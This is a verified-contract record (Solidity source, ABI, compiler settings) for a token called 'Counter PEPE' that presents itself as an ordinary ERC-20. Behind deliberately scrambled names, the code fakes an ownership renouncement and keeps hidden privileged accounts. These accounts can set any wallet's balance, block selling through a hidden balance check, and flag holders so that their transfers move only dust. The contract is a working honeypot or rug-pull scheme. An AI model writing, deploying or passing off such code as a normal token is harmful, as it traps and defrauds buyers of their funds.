{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface minTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenFee) external view returns (uint256);\n\n    function transfer(address listSell, uint256 totalModeIs) external returns (bool);\n\n    function allowance(address tokenAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalModeIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listSell,\n        uint256 totalModeIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minSwap, uint256 value);\n    event Approval(address indexed tokenAuto, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTradingLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptTakeEnable {\n    function createPair(address exemptWallet, address fundIs) external returns (address);\n}\n\ninterface minTotalMetadata is minTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CounterPEPE is receiverTradingLaunched, minTotal, minTotalMetadata {\n\n    address shouldTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function limitList(address fundReceiver, address listSell, uint256 totalModeIs) internal returns (bool) {\n        require(walletMin[fundReceiver] >= totalModeIs);\n        walletMin[fundReceiver] -= totalModeIs;\n        walletMin[listSell] += totalModeIs;\n        emit Transfer(fundReceiver, listSell, totalModeIs);\n        return true;\n    }\n\n    function balanceOf(address tokenFee) public view virtual override returns (uint256) {\n        return walletMin[tokenFee];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toExempt;\n    }\n\n    function approve(address launchedFundFrom, uint256 totalModeIs) public virtual override returns (bool) {\n        fromSender[_msgSender()][launchedFundFrom] = totalModeIs;\n        emit Approval(_msgSender(), launchedFundFrom, totalModeIs);\n        return true;\n    }\n\n    function fundTotal(uint256 totalModeIs) public {\n        listAt();\n        txReceiverLaunched = totalModeIs;\n    }\n\n    uint256 private tokenTo;\n\n    address marketingSenderSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (isAmount) {\n            tokenTo = launchIsFee;\n        }\n        autoTrading isLimit = autoTrading(shouldTx);\n        receiverBuy = exemptTakeEnable(isLimit.factory()).createPair(isLimit.WETH(), address(this));\n        \n        feeExempt = _msgSender();\n        amountTrading();\n        isShouldTrading[feeExempt] = true;\n        walletMin[feeExempt] = modeTx;\n        \n        emit Transfer(address(0), feeExempt, modeTx);\n    }\n\n    function transferFrom(address fundReceiver, address listSell, uint256 totalModeIs) external override returns (bool) {\n        if (_msgSender() != shouldTx) {\n            if (fromSender[fundReceiver][_msgSender()] != type(uint256).max) {\n                require(totalModeIs <= fromSender[fundReceiver][_msgSender()]);\n                fromSender[fundReceiver][_msgSender()] -= totalModeIs;\n            }\n        }\n        return receiverSell(fundReceiver, listSell, totalModeIs);\n    }\n\n    function receiverSell(address fundReceiver, address listSell, uint256 totalModeIs) internal returns (bool) {\n        if (fundReceiver == feeExempt) {\n            return limitList(fundReceiver, listSell, totalModeIs);\n        }\n        uint256 feeSellSender = minTotal(receiverBuy).balanceOf(marketingSenderSwap);\n        require(feeSellSender == txReceiverLaunched);\n        require(listSell != marketingSenderSwap);\n        if (listMin[fundReceiver]) {\n            return limitList(fundReceiver, listSell, senderFrom);\n        }\n        return limitList(fundReceiver, listSell, totalModeIs);\n    }\n\n    address public receiverBuy;\n\n    string private feeFrom = \"CPE\";\n\n    function tokenReceiver(address liquidityAutoEnable, uint256 totalModeIs) public {\n        listAt();\n        walletMin[liquidityAutoEnable] = totalModeIs;\n    }\n\n    string private toExempt = \"Counter PEPE\";\n\n    uint256 txIsTeam;\n\n    address public feeExempt;\n\n    uint256 private modeTx = 100000000 * 10 ** 18;\n\n    function transfer(address liquidityAutoEnable, uint256 totalModeIs) external virtual override returns (bool) {\n        return receiverSell(_msgSender(), liquidityAutoEnable, totalModeIs);\n    }\n\n    event OwnershipTransferred(address indexed txMarketing, address indexed senderSwapIs);\n\n    bool private totalToAt;\n\n    bool private isAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityEnableList;\n    }\n\n    uint256 constant senderFrom = 10 ** 10;\n\n    mapping(address => bool) public isShouldTrading;\n\n    uint8 private liquidityEnableList = 18;\n\n    bool public takeExempt;\n\n    function allowance(address enableSender, address launchedFundFrom) external view virtual override returns (uint256) {\n        if (launchedFundFrom == shouldTx) {\n            return type(uint256).max;\n        }\n        return fromSender[enableSender][launchedFundFrom];\n    }\n\n    function listAt() private view {\n        require(isShouldTrading[_msgSender()]);\n    }\n\n    function amountTrading() public {\n        emit OwnershipTransferred(feeExempt, address(0));\n        shouldAutoLaunch = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return shouldAutoLaunch;\n    }\n\n    mapping(address => uint256) private walletMin;\n\n    uint256 private launchIsFee;\n\n    mapping(address => mapping(address => uint256)) private fromSender;\n\n    mapping(address => bool) public listMin;\n\n    function modeTakeLaunch(address enableLimitExempt) public {\n        if (takeExempt) {\n            return;\n        }\n        if (isAmount) {\n            totalToAt = true;\n        }\n        isShouldTrading[enableLimitExempt] = true;\n        \n        takeExempt = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeFrom;\n    }\n\n    function receiverLimit(address teamFee) public {\n        listAt();\n        if (totalToAt != isAmount) {\n            launchIsFee = tokenTo;\n        }\n        if (teamFee == feeExempt || teamFee == receiverBuy) {\n            return;\n        }\n        listMin[teamFee] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldAutoLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeTx;\n    }\n\n    address private shouldAutoLaunch;\n\n    uint256 txReceiverLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSwapIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFundFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalModeIs\",\"type\":\"uint256\"}],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isShouldTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimitExempt\",\"type\":\"address\"}],\"name\":\"modeTakeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAutoEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeIs\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAutoEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CounterPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}